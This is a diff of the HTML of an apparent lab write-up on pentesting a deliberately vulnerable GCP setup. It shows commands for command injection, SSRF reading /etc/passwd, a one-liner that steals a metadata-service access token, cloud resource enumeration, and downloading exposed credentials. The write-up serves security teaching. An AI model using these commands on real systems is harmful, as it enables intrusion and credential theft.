style="color:#393A34"><span class="token plain">            &lt;div class=&quot;url&quot;&gt;https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40&lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;p&gt;&lt;small&gt;Endpoints: ?cmd=, ?url=, ?env=, ?secret=&lt;/small&gt;&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">              </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;div class=&quot;service&quot;&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;h3&gt;Cloud Run API Service&lt;/h3&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;p&gt;Containerized API service:&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;div class=&quot;url&quot;&gt;https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app&lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">              </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;div class=&quot;service&quot;&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;h3&gt;Storage Bucket&lt;/h3&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;p&gt;Public storage bucket:&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">            &lt;div class=&quot;url&quot;&gt;gs://vulnerable-bucket-39ca4c40&lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">              </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;hr&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;p&gt;&lt;a href=&quot;/&quot;&gt;← Back to DVWA&lt;/a&gt;&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        &lt;p&gt;&lt;small&gt;Last updated: 2026-01-31 14:33:44&lt;/small&gt;&lt;/p&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    &lt;/div&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/body&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&lt;/html&gt;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">04:33:44 andrey@andrey-lab ~ → </span><br></div></code></pre></div></div>
 <p><strong>What I discovered:</strong></p>
-<p>The<code>info.php</code>file was a goldmine of information. It exposed:</p>
+<p>The <code>info.php</code> file was a goldmine of information. It exposed:</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Cloud Function: https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Cloud Run: https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Storage Bucket: gs://vulnerable-bucket-39ca4c40</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Endpoints:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- ?cmd= - Command execution</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- ?url= - URL fetching</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- ?env= - Environment variables</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- ?secret= - Secret key</span><br></div></code></pre></div></div>
 <p><strong>This was critical for several reasons:</strong></p>
 <ul>
 <li class="">
-<p>**Cloud services exposed:**The main application might be hardened, but cloud services often have different security postures</p>
+<p><strong>Cloud services exposed:</strong> The main application might be hardened, but cloud services often have different security postures</p>
 </li>
 <li class="">
-<p>**Suspicious endpoints:**Parameters like<code>?cmd=</code>and<code>?url=</code>immediately raised red flags</p>
+<p><strong>Suspicious endpoints:</strong> Parameters like <code>?cmd=</code> and <code>?url=</code> immediately raised red flags</p>
 </li>
 <li class="">
-<p>**Attack surface expansion:**Instead of one target, I now had multiple services to test</p>
+<p><strong>Attack surface expansion:</strong> Instead of one target, I now had multiple services to test</p>
 </li>
 </ul>
-<p>**The Lesson:**Never underestimate information disclosure. A single exposed file can reveal an entire attack surface.</p>
+<p><strong>The Lesson:</strong> Never underestimate information disclosure. A single exposed file can reveal an entire attack surface.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exposed-git-repository">Exposed .git Repository<a href="#exposed-git-repository" class="hash-link" aria-label="Direct link to Exposed .git Repository" title="Direct link to Exposed .git Repository" translate="no">​</a></h3>
-<p>I also discovered the<code>.git</code>repository was accessible:</p>
+<p>I also discovered the <code>.git</code> repository was accessible:</p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s http://34.121.191.196/.git/config</span><br></div></code></pre></div></div>
 <p>This revealed:</p>
 <ul>
@@ -656,7 +298,7 @@ html
 <p>Potential access to source code and commit history</p>
 </li>
 </ul>
-<p>**Why this matters:**Exposed<code>.git</code>repositories can leak:</p>
+<p><strong>Why this matters:</strong> Exposed <code>.git</code> repositories can leak:</p>
 <ul>
 <li class="">
 <p>Source code</p>
@@ -675,34 +317,34 @@ html
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-4-cloud-service-testing--pivoting-to-a-weaker-target">Phase 4: Cloud Service Testing — Pivoting to a Weaker Target<a href="#phase-4-cloud-service-testing--pivoting-to-a-weaker-target" class="hash-link" aria-label="Direct link to Phase 4: Cloud Service Testing — Pivoting to a Weaker Target" title="Direct link to Phase 4: Cloud Service Testing — Pivoting to a Weaker Target" translate="no">​</a></h2>
 <p>With cloud services identified, I pivoted my focus. The main application had security level “impossible,” but the cloud services were a different story.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-command-injection">Testing Command Injection<a href="#testing-command-injection" class="hash-link" aria-label="Direct link to Testing Command Injection" title="Direct link to Testing Command Injection" translate="no">​</a></h3>
-<p>The<code>?cmd=</code>parameter in the Cloud Function immediately caught my attention. I tested for command injection:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami&quot;</span><br></div></code></pre></div></div>
-<p><strong>Result:</strong><code>www-data</code></p>
-<p>**Critical Vulnerability Confirmed!**The application was executing user-supplied commands without validation.</p>
+<p>The <code>?cmd=</code> parameter in the Cloud Function immediately caught my attention. I tested for command injection:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami&quot;</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> <code>www-data</code></p>
+<p><strong>Critical Vulnerability Confirmed!</strong> The application was executing user-supplied commands without validation.</p>
 <img src="https://cdn-images-1.medium.com/max/800/1*ufUPjRFFIpBpgbfj8X1MDQ.png" alt="Article image" width="1491" height="52" loading="lazy" decoding="async">
 <p>I escalated my testing:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Get</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">user</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ID</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">s &quot;...?cmd=id&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Result</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: uid</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data) gid</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data) </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">groups</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Read </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">system</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> files</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">s &quot;...?cmd=cat+/etc/passwd&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Result</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Full</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">etc</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">passwd file contents</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Get user ID</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?cmd=id&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Read system files</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?cmd=cat+/etc/passwd&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Result: Full /etc/passwd file contents</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*Bs12jeJnrsLaPxf0fsl38g.png" alt="Article image" width="1612" height="545" loading="lazy" decoding="async">
 <p><strong>Impact Assessment:</strong></p>
 <ul>
 <li class="">
-<p>**Remote Code Execution (RCE):**Complete control over the Cloud Function execution environment</p>
+<p><strong>Remote Code Execution (RCE):</strong> Complete control over the Cloud Function execution environment</p>
 </li>
 <li class="">
-<p>**File System Access:**Ability to read sensitive files</p>
+<p><strong>File System Access:</strong> Ability to read sensitive files</p>
 </li>
 <li class="">
-<p>**Potential for Privilege Escalation:**Depending on the service account permissions</p>
+<p><strong>Potential for Privilege Escalation:</strong> Depending on the service account permissions</p>
 </li>
 <li class="">
-<p>**Lateral Movement:**Potential to access other cloud resources</p>
+<p><strong>Lateral Movement:</strong> Potential to access other cloud resources</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-ssrf-server-side-request-forgery">Testing SSRF (Server-Side Request Forgery)<a href="#testing-ssrf-server-side-request-forgery" class="hash-link" aria-label="Direct link to Testing SSRF (Server-Side Request Forgery)" title="Direct link to Testing SSRF (Server-Side Request Forgery)" translate="no">​</a></h3>
-<p>The<code>?url=</code>parameter suggested SSRF vulnerability. I tested it:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test local file reading</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;...?url=file:///etc/passwd&quot;</span><br></div></code></pre></div></div>
-<p>**Result:**Successfully read<code>/etc/passwd</code>via the<code>file://</code>protocol.</p>
-<p>**SSRF Confirmed!**This vulnerability allows:</p>
+<p>The <code>?url=</code> parameter suggested SSRF vulnerability. I tested it:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Test local file reading</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?url=file:///etc/passwd&quot;</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> Successfully read <code>/etc/passwd</code> via the <code>file://</code> protocol.</p>
+<p><strong>SSRF Confirmed!</strong> This vulnerability allows:</p>
 <ul>
 <li class="">
 <p>Reading local files</p>
@@ -719,22 +361,22 @@ html
 </ul>
 <img src="https://cdn-images-1.medium.com/max/800/1*COSJOfhiW_keCNq-p9sNyw.png" alt="Article image" width="1612" height="545" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exposing-environment-variables-and-secrets">Exposing Environment Variables and Secrets<a href="#exposing-environment-variables-and-secrets" class="hash-link" aria-label="Direct link to Exposing Environment Variables and Secrets" title="Direct link to Exposing Environment Variables and Secrets" translate="no">​</a></h3>
-<p>The<code>?env=</code>and<code>?secret=</code>parameters were too tempting to ignore:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Get all environment variables</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;...?env=1&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | python3 -m json.tool</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Get secret key directly</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;...?secret=1&quot;</span><br></div></code></pre></div></div>
+<p>The <code>?env=</code> and <code>?secret=</code> parameters were too tempting to ignore:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Get all environment variables</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?env=1&quot; | python3 -m json.tool</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Get secret key directly</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?secret=1&quot;</span><br></div></code></pre></div></div>
 <p><strong>Critical Findings:</strong></p>
 <ul>
-<li class=""><strong>SECRET_KEY exposed:</strong><code>exposed-secret-39ca4c40</code></li>
+<li class=""><strong>SECRET_KEY exposed:</strong> <code>exposed-secret-39ca4c40</code></li>
 </ul>
 <img src="https://cdn-images-1.medium.com/max/800/1*AtMB-F8i_IQt-b3bucplXQ.png" alt="Article image" width="1686" height="60" loading="lazy" decoding="async">
 <ul>
 <li class="">
-<p>**All environment variables leaked:**Including project details, paths, service names</p>
+<p><strong>All environment variables leaked:</strong> Including project details, paths, service names</p>
 </li>
 <li class="">
-<p>**Configuration information:**Complete application configuration</p>
+<p><strong>Configuration information:</strong> Complete application configuration</p>
 </li>
 </ul>
-<p>**Why this is critical:**Exposed secrets can lead to:</p>
+<p><strong>Why this is critical:</strong> Exposed secrets can lead to:</p>
 <ul>
 <li class="">
 <p>Session hijacking</p>
@@ -766,25 +408,25 @@ html
 </li>
 </ul>
 <p>I attempted to access it via command injection:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request(&#x27;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#x27;);req.add_header(&#x27;Metadata-Flavor&#x27;,&#x27;Google&#x27;);token=json.loads(urllib.request.urlopen(req).read().decode());print(token[&#x27;access_token&#x27;])&quot;</span><br></div></code></pre></div></div>
-<p>**Result:**Successfully obtained a GCP access token!</p>
-<p>**Note:**In some cases, the metadata service might return 403 Forbidden, which is actually good security practice. However, in this case, access was possible.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request(&#x27;http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token&#x27;);req.add_header(&#x27;Metadata-Flavor&#x27;,&#x27;Google&#x27;);token=json.loads(urllib.request.urlopen(req).read().decode());print(token[&#x27;access_token&#x27;])&quot;</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> Successfully obtained a GCP access token!</p>
+<p><strong>Note:</strong> In some cases, the metadata service might return 403 Forbidden, which is actually good security practice. However, in this case, access was possible.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="enumerating-cloud-resources">Enumerating Cloud Resources<a href="#enumerating-cloud-resources" class="hash-link" aria-label="Direct link to Enumerating Cloud Resources" title="Direct link to Enumerating Cloud Resources" translate="no">​</a></h2>
 <p>With an access token, I could now enumerate GCP resources using the GCP APIs:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">TOKEN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;&lt;access_token&gt;&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">TOKEN=&quot;&lt;access_token&gt;&quot;</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Get project information</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;https://cloudresourcemanager.googleapis.com/v1/projects/cloud-pentest-lab-1769759595&quot;</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># List storage buckets</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;https://storage.googleapis.com/storage/v1/b?project=cloud-pentest-lab-1769759595&quot;</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># List service accounts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -H &quot;Authorization: Bearer $TOKEN&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts&quot;</span><br></div></code></pre></div></div>
 <p><strong>Key Discoveries:</strong></p>
 <ul>
 <li class="">
-<p><strong>Publicly accessible storage bucket:</strong><code>vulnerable-bucket-39ca4c40</code></p>
+<p><strong>Publicly accessible storage bucket:</strong> <code>vulnerable-bucket-39ca4c40</code></p>
 </li>
 <li class="">
-<p>**Overprivileged service account:**With<code>roles/owner</code>(full project access)</p>
+<p><strong>Overprivileged service account:</strong> With <code>roles/owner</code> (full project access)</p>
 </li>
 <li class="">
-<p>**Multiple cloud services:**Cloud Functions, Cloud Run, Storage</p>
+<p><strong>Multiple cloud services:</strong> Cloud Functions, Cloud Run, Storage</p>
 </li>
 </ul>
 <p>This enumeration revealed the true scope of the security issues.</p>
@@ -792,44 +434,44 @@ html
 <p>The discovery of a publicly accessible storage bucket was a major finding. Let’s see what was exposed.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="listing-bucket-contents">Listing Bucket Contents<a href="#listing-bucket-contents" class="hash-link" aria-label="Direct link to Listing Bucket Contents" title="Direct link to Listing Bucket Contents" translate="no">​</a></h3>
 <p>I tested if the bucket was truly public:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/&quot;</span><br></div></code></pre></div></div>
-<p>**Result:**XML listing showing all files in the bucket, including:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/&quot;</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> XML listing showing all files in the bucket, including:</p>
 <img src="https://cdn-images-1.medium.com/max/800/1*4_WVy0xhv0kXdEha69JwLQ.png" alt="Article image" width="1917" height="122" loading="lazy" decoding="async">
 <ul>
 <li class="">
-<p><code>function-code.zip</code>(Cloud Function source code)</p>
+<p><code>function-code.zip</code> (Cloud Function source code)</p>
 </li>
 <li class="">
-<p><code>secrets/database-credentials.json</code>(Sensitive credentials)</p>
+<p><code>secrets/database-credentials.json</code> (Sensitive credentials)</p>
 </li>
 </ul>
-<p>**Critical Misconfiguration:**The bucket had no access controls, allowing anyone to list and download files.</p>
+<p><strong>Critical Misconfiguration:</strong> The bucket had no access controls, allowing anyone to list and download files.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="downloading-sensitive-files">Downloading Sensitive Files<a href="#downloading-sensitive-files" class="hash-link" aria-label="Direct link to Downloading Sensitive Files" title="Direct link to Downloading Sensitive Files" translate="no">​</a></h3>
 <p>I downloaded the exposed files:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Download database credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Download function source code</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -o </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">function</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">code</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">zip</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Download database credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Download function source code</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl -s &quot;https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip&quot; -o function-code.zip</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*qmRb0dI1r4yUPG1v_av1tg.png" alt="Article image" width="1904" height="60" loading="lazy" decoding="async">
 <img src="https://cdn-images-1.medium.com/max/800/1*oCZAG2VeK07X1n5ahd-fbQ.png" alt="Article image" width="1854" height="121" loading="lazy" decoding="async">
